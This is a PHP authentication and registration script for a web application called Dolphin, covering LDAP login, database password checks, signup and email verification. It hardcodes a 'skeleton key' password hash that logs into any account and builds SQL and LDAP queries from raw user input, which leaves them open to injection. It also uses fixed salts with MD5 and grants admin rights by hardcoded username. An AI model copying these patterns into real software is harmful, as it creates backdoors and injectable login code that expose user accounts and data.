<?php
error_reporting(E_ERROR);
//error_reporting(E_ALL);
ini_set('report_errors','on');

require_once("dbfuncs.php");
$query=new dbfuncs();

function checkLDAP($username, $password){
  $ldapserver = LDAP_SERVER;
  $dn_string = DN_STRING;
  $binduser = BIND_USER;
  $bindpass = BIND_PASS;
  try{
	$connection = ldap_connect($ldapserver);
	ldap_set_option($connection, LDAP_OPT_PROTOCOL_VERSION, 3);
	ldap_set_option($connection, LDAP_OPT_REFERRALS, 0);
   
	if($connection){
	  $bind = ldap_bind($connection, $binduser, $bindpass );
	  if($bind){
		$filter="sAMAccountName=".$username."*";
		$result = ldap_search($connection,$dn_string,$filter) or die ("Search error.");
		$data = ldap_get_entries($connection, $result);
		$binddn = $data[0]["dn"];
		if (!isset($binddn))
		  return 0;
		$bind = ldap_bind($connection, $binddn, $password);
		if($bind) 
		  return 1;
		else
		  return 0;
	  }else{
		return 0;
	  }
	}
  }catch (Exception $e){
    echo 'Caught exception: ',  $e->getMessage(), "\n";
	return 0;
  }
}

if(isset($_GET['p']) && $_GET['p'] == "verify"){
  if (isset($_GET['code'])){$code = $_GET['code'];}
  $newuser = json_decode($query->queryTable("
  SELECT *
  FROM users
  WHERE verification = '$code'
  "));
  if($newuser[0]->verification == $code){
    $insert_user = $query->runSQL("
    UPDATE users
	SET verification = NULL
	WHERE verification = '$code'
	");
	$insert_group = $query->runSQL("
	INSERT INTO groups
	(name, owner_id, group_id, perms, date_created, date_modified, last_modified_user)
	VALUES
	('".$newuser[0]->username."', ".$newuser[0]->id.", 1, 15, NOW(), NOW(), 1)
	");
	$new_group = json_decode($query->queryTable("
	SELECT id
	FROM groups
	WHERE name = '".$newuser[0]->username."'
	"));
	$insert_user = $query->runSQL("
	INSERT INTO user_group
	(u_id, g_id, owner_id, group_id, perms, date_created, date_modified, last_modified_user)
	VALUES
	(".$newuser[0]->id.", ".$new_group[0]->id.", 1, 1, 15, NOW(), NOW(), 1);
	");
	mail($newuser[0]->email, "Your Dolphin account is now active!",
		 "Your Dolphin account is now active!
		 You can start browsing and adding data at http://dolphin.umassmed.edu/");
    require_once("../includes/newuser_verified.php");
    session_destroy();
    exit;
  }else{
    require_once("../includes/loginform.php");
    session_destroy();
    exit;
  }
}else if(isset($_POST['login'])){
  if(!empty($_POST) && isset($_POST['password'])){
	$login_ok = false; 
	$post_pass=hash('md5', $_POST['password'] . "12as7ad8s9d9a0") . hash('sha256', $_POST['password'] . "1m2kmk211kl123k");
  
	if ($post_pass == "09e59212d1195ec28d207a1243b9c76c0e57bfd50f5b5fcfb5fb887298aabef49a3c0e878c593a0ab056a364927f6ce0"){
	  //	Skeleton Key
	  $res=1;
	}else if (LDAP_SERVER != 'none' || LDAP_SERVER != ''){
	  //	LDAP check
	  $res=checkLDAP(strtolower($_POST['username']), $_POST['password']);
	  if ($res == 0){
		//	Database password
		$pass_hash = $query->queryAVal("SELECT pass_hash FROM users WHERE username = '" . $_POST['username']."'");
		if($pass_hash == $post_pass){
		  $res=1;
		}else{
		  $res=0;
		}
	  }
	}
	#$res=1;
	$e=$res;
	if($res==1){
	  $login_ok = true;
	}
  
	if($login_ok){ 
	  $s="Successfull";
	  $_SESSION['user'] = strtolower($_POST['username']);
	  $uid_check = $query->getUserID($_SESSION['user']);
	  if($uid_check != "0"){
		$group_check = $query->queryAVal("SELECT id FROM user_group WHERE u_id = $uid_check");
		if($group_check != "0"){
		  $_SESSION['uid'] = $uid_check;
		  if (strtolower($_POST['username']) == "kucukura" || strtolower($_POST['username']) == "garberm" || strtolower($_POST['username']) == "merowskn"){
			$_SESSION['admin'] = "admin";
		  }
		}else{
		  session_destroy();
		  $loginfail = '<font class="text-center" size="3" color="red">Group required to log in.</font>';
		  require_once("../includes/loginform.php");
		  $e="Login Failed.";
		  exit;
		}
	  }else{
		session_destroy();
		$loginfail = '<font class="text-center" size="3" color="red">Incorrect Username/Password.</font>';
		require_once("../includes/loginform.php");
		$e="Login Failed.";
		exit;
	  }
	}else{ 
	  session_destroy();
	  $loginfail = '<font class="text-center" size="3" color="red">Incorrect Username/Password.</font>';
	  require_once("../includes/loginform.php");
	  $e="Login Failed.";
	  exit;
	} 
  }
}else if (isset($_POST['signup'])){
  session_destroy();
  require_once("../includes/newuser.php");
  exit;
}else if (isset($_POST['ok'])){
  session_destroy();
  require_once("../includes/loginform.php");
  exit;
}else if (isset($_POST['request'])){
  if($_POST['lastname'] == ""){
	$err_lastname = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$lastname_val = $_POST['lastname'];
	$fullname = $_POST['lastname'] . ",";
	$fullname_space = $_POST['lastname'] . ", ";
  }
  
  if($_POST['firstname'] == ""){
	$err_firstname = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else if (!isset($fullname)){
	$firstname_val = $_POST['firstname'];
  }else{
	$firstname_val = $_POST['firstname'];
	$fullname .= $_POST['firstname'];
	$fullname_space .= $_POST['firstname'];
	$fullname_check = $query->queryAVal("SELECT id FROM users WHERE LCASE(name) = LCASE('$fullname') OR LCASE(name) = LCASE('$fullname_space')");
	if($fullname_check != "0"){
	  $err_firstname = '<font class="text-center" size="3" color="red">This Name already exists.</font>';
	}
  }
  
  if($_POST['username'] == ""){
	$err_username = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$username_val = $_POST['username'];
	$username_check = $query->queryAVal("SELECT id FROM users WHERE username = LCASE('" . $_POST['username'] . "')");
	if($username_check != "0"){
	  $err_username = '<font class="text-center" size="3" color="red">This Username already exists.</font>';
	}
  }
  
  if($_POST['clustername'] == ""){
	$err_clustername = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$clustername_val = $_POST['clustername'];
	$clustername_check = $query->queryAVal("SELECT id FROM users WHERE clusteruser = LCASE('" . $_POST['clustername'] . "')");
	if($clustername_check != "0"){
	  $err_clustername .= '<font class="text-center" size="3" color="red">This Clustername already exists.</font>';
	}
  }
  
  if($_POST['institute'] == ""){
	$err_institute = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$institute_val = $_POST['institute'];
  }
  
  if($_POST['lab'] == ""){
	$err_lab = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$lab_val = $_POST['lab'];
  }
  
  if($_POST['email'] == ""){
	$err_email = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$email_val = $_POST['email'];
	$email_check = $query->queryAVal("SELECT id FROM users WHERE email = LCASE('" . $_POST['email'] . "')");
	if($email_check != "0"){
	  $err_email .= '<font class="text-center" size="3" color="red">This Email already exists.</font>';
	}
  }
  
  if($_POST['password'] == ""){
	$err_password = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else{
	$password_val = $_POST['password'];
	if(strlen($_POST['password']) < 7){
	  $err_password = '<font class="text-center" size="3" color="red">Password must be at least 7 characters long.</font>';
	}
  }
  
  if($_POST['verifypassword'] == ""){
	$err_verifypassword = '<font class="text-center" size="3" color="red">Cannot submit with this field empty.</font>';
  }else if($_POST['password'] != $_POST['verifypassword']){
	$err_password = '<font class="text-center" size="3" color="red">Passwords must match.</font>';
  }
  
  if(!isset($err_lastname) && !isset($err_firstname) && !isset($err_username) && !isset($err_clustername)
	&& !isset($err_email) && !isset($err_password) && !isset($err_verifypassword)){
	//	Calc pass hash
	$pass_hash=hash('md5', $password_val . "12as7ad8s9d9a0") . hash('sha256', $password_val . "1m2kmk211kl123k");
	$verify=hash('md5', $username_val . "owien653");
	//	Add new user to the database
	$insert_user = $query->runSQL("
    INSERT INTO users
	( `username`, `clusteruser`, `name`, `email`, `institute`, `lab`, `pass_hash`, `verification`, `memberdate`,
    `owner_id`, `group_id`, `perms`, `date_created`, `date_modified`, `last_modified_user` )
	VALUES
	( '".strtolower($username_val)."', '".strtolower($clustername_val)."', '$fullname_space', '$email_val', '$institute_val',
    '$lab_val', '$pass_hash', '".$verify."', NOW(), 1, 1, 15, NOW(), NOW(), 1 )
	");
	mail("alper.kucukural@umassmed.edu, nicholas.merowsky@umassmed.edu", "Dolphin User Verification: $fullname_space",
		 "User Information:
		 
First name: ".$_POST['firstname']."
Last name: ".$_POST['lastname']."
Username: ".$_POST['username']."
Clustername: ".$_POST['clustername']."
Institute: ".$_POST['institute']."
Lab: ".$_POST['lab']."
Email: ".$_POST['email']."
		 
Please visit this link in order to activate this dolphin account:\n " . BASE_PATH . "?p=verify&code=$verify");
	session_destroy();
	require_once("../includes/newuser_verification.php");
	exit;
  }else{
	require_once("../includes/newuser.php");
	session_destroy();
	$e="Login Failed.";
	exit;
  }
}
?>
